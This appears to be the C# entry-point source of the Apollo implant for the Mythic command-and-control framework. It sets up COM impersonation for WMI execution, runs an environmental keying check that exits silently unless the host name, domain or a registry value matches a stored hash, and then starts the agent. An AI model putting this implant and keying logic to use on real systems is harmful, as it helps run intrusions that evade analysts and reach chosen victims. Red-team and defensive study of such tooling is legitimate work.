using System;
using ApolloInterop.Serializers;
using System.Collections.Generic;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using System.IO.Pipes;
using ApolloInterop.Structs.ApolloStructs;
using System.Text;
using System.Threading;
using System.Linq;
using System.Collections.Concurrent;
using ApolloInterop.Classes.Core;
using ApolloInterop.Classes.Events;
using ApolloInterop.Enums.ApolloEnums;
using System.Runtime.InteropServices;
using ApolloInterop.Utils;
using System.Security.Cryptography;
using Microsoft.Win32;

namespace Apollo
{
    class Program
    {
        private static JsonSerializer _jsonSerializer = new JsonSerializer();
        private static AutoResetEvent _receiverEvent = new AutoResetEvent(false);
        private static ConcurrentQueue<IMythicMessage> _receiverQueue = new ConcurrentQueue<IMythicMessage>();
        private static ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>> MessageStore = new ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>>();
        private static AutoResetEvent _connected = new AutoResetEvent(false);
        private static ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private static Action<object> _sendAction;
        private static CancellationTokenSource _cancellationToken = new CancellationTokenSource();
        private static AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private static AutoResetEvent _complete  = new AutoResetEvent(false);
        private static bool _completed;
        private static Action<object> _flushMessages;
        public enum RPC_AUTHN_LEVEL
        {
            PKT_PRIVACY = 6
        }

        public enum RPC_IMP_LEVEL
        {
            IMPERSONATE = 3
        }

        public enum EOLE_AUTHENTICATION_CAPABILITIES
        {
            DYNAMIC_CLOAKING = 0x40
        }
        [DllImport("ole32.dll")]
        static extern int CoInitializeSecurity(IntPtr pSecDesc, int cAuthSvc, IntPtr asAuthSvc, IntPtr pReserved1, RPC_AUTHN_LEVEL dwAuthnLevel, RPC_IMP_LEVEL dwImpLevel, IntPtr pAuthList, EOLE_AUTHENTICATION_CAPABILITIES dwCapabilities, IntPtr pReserved3);
        // we need this to happen first so we can use impersonation tokens with wmiexecute
        static readonly int _security_init = CoInitializeSecurity(IntPtr.Zero, -1, IntPtr.Zero, IntPtr.Zero, RPC_AUTHN_LEVEL.PKT_PRIVACY, RPC_IMP_LEVEL.IMPERSONATE, IntPtr.Zero, EOLE_AUTHENTICATION_CAPABILITIES.DYNAMIC_CLOAKING, IntPtr.Zero);
        public static void Main(string[] args)
        {
            if (_security_init != 0)
            {
                DebugHelp.DebugWriteLine($"CoInitializeSecurity status: {_security_init}");
            }
            
            // Check environmental keying before starting agent
            if (!CheckEnvironmentalKeying())
            {
                // Exit silently if keying check fails
                return;
            }
            
            Agent.Apollo ap = new Agent.Apollo(Config.PayloadUUID);
            ap.Start();
        }
        
        private static bool CheckEnvironmentalKeying()
        {
            // If keying is not enabled, always return true
            if (!Config.KeyingEnabled)
            {
                return true;
            }
            
            try
            {
                // Handle Registry keying separately (3 = Registry)
                if (Config.KeyingMethod == 3)
                {
                    return CheckRegistryKeying();
                }
                
                string currentValue = "";
                
                // Get the appropriate value based on keying method
                // 1 = Hostname, 2 = Domain
                if (Config.KeyingMethod == 1)
                {
                    currentValue = Environment.MachineName;
                }
                else if (Config.KeyingMethod == 2)
                {
                    currentValue = Environment.UserDomainName;
                }
                else
                {
                    // Unknown keying method, fail safe and exit
                    return false;
                }
                
                // Convert to uppercase before hashing (same as build time)
                currentValue = currentValue.ToUpper();
                
                // For hostname (1), just check the single value
                if (Config.KeyingMethod == 1)
                {
                    string currentValueHash = ComputeSHA256Hash(currentValue);
                    if (currentValueHash.Equals(Config.KeyingValueHash, StringComparison.OrdinalIgnoreCase))
                    {
                        return true;
                    }
                }
                // For domain (2), check full domain and all parts split by '.'
                else if (Config.KeyingMethod == 2)
                {
                    // First try the full domain
                    string fullDomainHash = ComputeSHA256Hash(currentValue);
                    if (fullDomainHash.Equals(Config.KeyingValueHash, StringComparison.OrdinalIgnoreCase))
                    {
                        return true;
                    }
                    
                    // Then try each part of the domain split by '.'
                    string[] domainParts = currentValue.Split('.');
                    foreach (string part in domainParts)
                    {
                        if (!string.IsNullOrEmpty(part))
                        {
                            string partHash = ComputeSHA256Hash(part);
                            if (partHash.Equals(Config.KeyingValueHash, StringComparison.OrdinalIgnoreCase))
                            {
                                return true;
                            }
                        }
                    }
                }
                
                // Keying check failed
                return false;
            }
            catch
            {
                // If any error occurs during keying check, fail safe and exit
                return false;
            }
        }
        
        private static bool CheckRegistryKeying()
        {
            try
            {
                // Parse the registry path
                string regPath = Config.RegistryPath;
                if (string.IsNullOrEmpty(regPath))
                {
                    return false;
                }
                
                // Split registry path into hive, subkey, and value name
                // Expected format: HKLM\SOFTWARE\Path\To\Key\ValueName
                string[] pathParts = regPath.Split('\\');
                if (pathParts.Length < 2)
                {
                    return false;
                }
                
                // Get the registry hive
                RegistryKey hive = GetRegistryHive(pathParts[0]);
                if (hive == null)
                {
                    return false;
                }
                
                // Get the value name (last part)
                string valueName = pathParts[pathParts.Length - 1];
                
                // Get the subkey path (everything between hive and value name)
                string subKeyPath = string.Join("\\", pathParts, 1, pathParts.Length - 2);
                
                // Open the registry key
                using (RegistryKey key = hive.OpenSubKey(subKeyPath))
                {
                    if (key == null)
                    {
                        // Registry key doesn't exist
                        return false;
                    }
                    
                    // Get the registry value
                    object regValue = key.GetValue(valueName);
                    if (regValue == null)
                    {
                        // Registry value doesn't exist
                        return false;
                    }
                    
                    string regValueString = regValue.ToString();
                    
                    // Check based on comparison mode: 1 = Matches, 2 = Contains
                    if (Config.RegistryComparison == 1)
                    {
                        // Hash-based secure matching
                        string regValueHash = ComputeSHA256Hash(regValueString.ToUpper());
                        return regValueHash.Equals(Config.KeyingValueHash, StringComparison.OrdinalIgnoreCase);
                    }
                    else if (Config.RegistryComparison == 2)
                    {
                        // Plaintext contains matching (weak security)
                        return regValueString.IndexOf(Config.RegistryValue, StringComparison.OrdinalIgnoreCase) >= 0;
                    }
                }
                
                return false;
            }
            catch
            {
                // If any error occurs, fail safe and exit
                return false;
            }
        }
        
        private static RegistryKey GetRegistryHive(string hiveName)
        {
            switch (hiveName.ToUpper())
            {
                case "HKLM":
                case "HKEY_LOCAL_MACHINE":
                    return Registry.LocalMachine;
                case "HKCU":
                case "HKEY_CURRENT_USER":
                    return Registry.CurrentUser;
                case "HKCR":
                case "HKEY_CLASSES_ROOT":
                    return Registry.ClassesRoot;
                case "HKU":
                case "HKEY_USERS":
                    return Registry.Users;
                case "HKCC":
                case "HKEY_CURRENT_CONFIG":
                    return Registry.CurrentConfig;
                default:
                    return null;
            }
        }
        
        private static string ComputeSHA256Hash(string input)
        {
            using (SHA256 sha256 = SHA256.Create())
            {
                byte[] hashBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(input));
                StringBuilder sb = new StringBuilder();
                foreach (byte b in hashBytes)
                {
                    sb.Append(b.ToString("x2"));
                }
                return sb.ToString();
            }
        }

        private static void Client_Disconnect(object sender, NamedPipeMessageArgs e)
        {
            e.Pipe.Close();
            _complete.Set();
        }

        private static void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
        {
            System.Threading.Tasks.Task.Factory.StartNew(_sendAction, e.Pipe, _cancellationToken.Token);
        }

        private static void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            // Potentially delete this since theoretically the sender Task does everything
            if (pipe.IsConnected)
            {
                pipe.EndWrite(result);
                if (!_cancellationToken.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] bdata))
                {
                    pipe.BeginWrite(bdata, 0, bdata.Length, OnAsyncMessageSent, pipe);
                }
            }
        }

        private static void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
        {
            IPCData d = args.Data;
            string msg = Encoding.UTF8.GetString(d.Data.Take(d.DataLength).ToArray());
            Console.Write(msg);
        }

        private static void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for (int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            IMythicMessage msg = _jsonSerializer.DeserializeIPCMessage(data.ToArray(), mt);
            //Console.WriteLine("We got a message: {0}", mt.ToString());
            _receiverQueue.Enqueue(msg);
            _receiverEvent.Set();
        }
    }
}
